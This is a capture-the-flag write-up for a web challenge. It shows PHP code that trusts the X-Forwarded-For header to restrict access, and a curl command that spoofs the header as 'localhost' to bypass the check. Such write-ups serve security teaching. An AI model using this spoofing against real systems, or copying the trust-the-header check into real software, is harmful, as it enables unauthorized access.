### Challenge ###
giraffe notes
100
Easy
I bet you can't access my notes on giraffes!

http://chal.competitivecyber.club:8081

Flag format: CACI{.*}

Author: CACI

### Solution ###
We have the source code of the website. Upon inspecting the source code:
```php
<?php
$allowed_ip = ['localhost', '127.0.0.1'];

if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ip)) {
    $allowed = true;
} else {
    $allowed = false;
}
?>

<!DOCTYPE html>
<html>

<head>
// other unnecessary html code
```
we can notice that the server checks if the x-forwarded-for header is equal to localhost or not so we just have to add x-forwarded-for header in request.

Curl command : ```bash
curl -v http://chal.competitivecyber.club:8081/ -H "X-forwarded-for: localhost"
```
